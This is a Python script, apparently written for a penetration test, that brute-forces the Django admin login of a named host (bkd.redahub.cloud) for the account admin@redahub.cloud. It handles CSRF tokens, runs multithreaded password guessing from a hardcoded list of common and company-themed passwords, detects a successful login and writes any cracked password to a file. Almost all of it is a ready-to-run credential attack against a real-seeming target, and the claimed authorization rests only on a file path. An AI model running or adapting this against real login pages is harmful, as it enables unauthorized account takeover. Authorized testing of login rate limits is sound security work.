#!/usr/bin/env python3
"""
Django Admin Login Bruteforce - REDAHUB Engagement
Target: https://bkd.redahub.cloud/admin/login/
Author: Neural-OffSec-Team
Date: 15-11-2025
Engagement: 2025-11-06-REDAHUB-web-wildcard
Authorization: /Users/th3_w6rst/Desktop/Autorizacao_Pentest.pdf

CVSS: N/A (Testing Tool)
CWE: Testing for CWE-307 (Improper Restriction of Excessive Authentication Attempts)
"""

import requests
import time
import re
from typing import Optional, Tuple, List
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DjangoAdminBruteforce:
    def __init__(self, target_url: str, username: str):
        self.target_url = target_url
        self.username = username
        self.session = requests.Session()
        self.session.verify = False
        self.attempts = 0
        self.rate_limited = False
        self.csrf_token = None

    def get_csrf_token(self) -> Optional[str]:
        """Extrai CSRF token do formulÃ¡rio de login"""
        try:
            resp = self.session.get(self.target_url, timeout=10)
            match = re.search(r'csrfmiddlewaretoken["\s]*value="([^"]+)"', resp.text)
            if match:
                return match.group(1)
            return None
        except Exception as e:
            print(f"[!] Erro ao obter CSRF token: {e}")
            return None

    def test_login(self, password: str) -> Tuple[bool, str, float]:
        """
        Testa uma combinaÃ§Ã£o username:password

        Returns:
            (success, message, response_time_ms)
        """
        start_time = time.time()

        # Renovar CSRF token a cada tentativa
        self.csrf_token = self.get_csrf_token()
        if not self.csrf_token:
            return False, "CSRF token nÃ£o encontrado", 0.0

        data = {
            'username': self.username,
            'password': password,
            'csrfmiddlewaretoken': self.csrf_token,
            'next': '/admin/'
        }

        headers = {
            'Referer': self.target_url,
            'User-Agent': 'Mozilla/5.0 (Pentest-Authorized)',
        }

        try:
            resp = self.session.post(
                self.target_url,
                data=data,
                headers=headers,
                timeout=15,
                allow_redirects=False
            )

            elapsed_ms = (time.time() - start_time) * 1000
            self.attempts += 1

            # Verificar rate limiting
            if resp.status_code == 429:
                self.rate_limited = True
                return False, "RATE LIMITED (429)", elapsed_ms

            # Success: redirect para /admin/
            if resp.status_code in [301, 302, 303] and '/admin/' in resp.headers.get('Location', ''):
                return True, "LOGIN SUCCESS", elapsed_ms

            # Failure indicators
            if 'incorrect' in resp.text.lower() or 'senha' in resp.text.lower():
                return False, "Invalid password", elapsed_ms

            if 'nÃ£o encontrado' in resp.text.lower():
                return False, "User not found", elapsed_ms

            return False, f"Unknown response (HTTP {resp.status_code})", elapsed_ms

        except requests.exceptions.Timeout:
            return False, "TIMEOUT", 15000.0
        except Exception as e:
            return False, f"ERROR: {str(e)}", 0.0

    def bruteforce(self, password_list: List[str], max_threads: int = 3) -> Optional[str]:
        """
        Executa bruteforce com lista de senhas

        Args:
            password_list: Lista de senhas para testar
            max_threads: NÃºmero mÃ¡ximo de threads paralelas (padrÃ£o: 3)

        Returns:
            Senha vÃ¡lida se encontrada, None caso contrÃ¡rio
        """
        print(f"\n[*] Iniciando bruteforce Django Admin")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Username: {self.username}")
        print(f"[*] Passwords: {len(password_list)}")
        print(f"[*] Threads: {max_threads}")
        print(f"[*] Authorization: REDAHUB Engagement 2025-11-06\n")

        found_password = None

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = {executor.submit(self.test_login, pwd): pwd for pwd in password_list}

            for i, future in enumerate(as_completed(futures), 1):
                password = futures[future]

                try:
                    success, message, elapsed = future.result()

                    status_emoji = "âœ…" if success else "âŒ"
                    print(f"[{i}/{len(password_list)}] {status_emoji} {self.username}:{password:20s} â†’ {message} ({elapsed:.2f}ms)")

                    if success:
                        found_password = password
                        print(f"\nğŸ¯ [SUCCESS] Valid credentials found: {self.username}:{password}")
                        # Cancelar tarefas restantes
                        for f in futures:
                            f.cancel()
                        break

                    if self.rate_limited:
                        print(f"\nâš ï¸  [RATE LIMITED] Servidor bloqueou requisiÃ§Ãµes. Abortando...")
                        break

                    # Delay entre tentativas (3-5 seg)
                    time.sleep(3 + (i % 3))

                except Exception as e:
                    print(f"[!] Erro na tentativa {password}: {e}")

        return found_password

    def generate_report(self, found_password: Optional[str]):
        """Gera relatÃ³rio final"""
        print(f"\n{'='*60}")
        print(f"ğŸ“Š RELATÃ“RIO FINAL - Django Admin Bruteforce")
        print(f"{'='*60}")
        print(f"Target: {self.target_url}")
        print(f"Username: {self.username}")
        print(f"Total attempts: {self.attempts}")
        print(f"Rate limiting detected: {'âœ… SIM' if self.rate_limited else 'âŒ NÃƒO'}")

        if found_password:
            print(f"\nğŸ¯ CREDENCIAIS VÃLIDAS:")
            print(f"   {self.username}:{found_password}")
            print(f"\nâš ï¸  IMPACTO: CRÃTICO (Acesso total ao Django Admin)")
        else:
            print(f"\nâœ… Nenhuma credencial vÃ¡lida encontrada na lista testada")
            if self.rate_limited:
                print(f"   (Teste interrompido por rate limiting)")

        print(f"{'='*60}\n")


def main():
    """Executa teste de bruteforce Django Admin"""

    # ConfiguraÃ§Ã£o
    TARGET = "https://bkd.redahub.cloud/admin/login/"
    USERNAME = "admin@redahub.cloud"

    # Lista de senhas COMUM (top 20 mais usadas)
    COMMON_PASSWORDS = [
        "admin",
        "password",
        "123456",
        "Admin@123",
        "Redahub@2024",
        "Redahub@2025",
        "django",
        "django123",
        "Admin@2024",
        "Admin@2025",
        "Suporte@123",
        "redahub",
        "admin123",
        "Password@123",
        "welcome",
        "Welcome@123",
        "root",
        "toor",
        "qwerty",
        "12345678",
    ]

    print("""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘          Django Admin Bruteforce - AUTHORIZED            â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘ Engagement: REDAHUB 2025-11-06                          â•‘
â•‘ Authorization: /Users/th3_w6rst/Desktop/Autorizacao_Pentest.pdf â•‘
â•‘ Scope: *.redahub.cloud (wildcard)                       â•‘
â•‘ Operator: Neural-OffSec-Team                            â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """)

    # ConfirmaÃ§Ã£o
    confirm = input("âš ï¸  Confirmar execuÃ§Ã£o do bruteforce? (YES para continuar): ")
    if confirm != "YES":
        print("[!] Abortado pelo operador")
        return

    # Executar bruteforce
    bruteforcer = DjangoAdminBruteforce(TARGET, USERNAME)
    found_password = bruteforcer.bruteforce(COMMON_PASSWORDS, max_threads=3)
    bruteforcer.generate_report(found_password)

    # Salvar evidÃªncias
    if found_password:
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        evidence_file = f"/Users/th3_w6rst/Neural-OffSec-Team/clients/REDAHUB/2025-11-06-REDAHUB-web-wildcard/04-evidence/{timestamp}-BRT-django-admin-credentials.txt"

        with open(evidence_file, 'w') as f:
            f.write(f"Django Admin Valid Credentials\n")
            f.write(f"Timestamp: {timestamp} BRT\n")
            f.write(f"Target: {TARGET}\n")
            f.write(f"Username: {USERNAME}\n")
            f.write(f"Password: {found_password}\n")
            f.write(f"Attempts: {bruteforcer.attempts}\n")

        print(f"ğŸ’¾ EvidÃªncia salva: {evidence_file}")


if __name__ == "__main__":
    main()
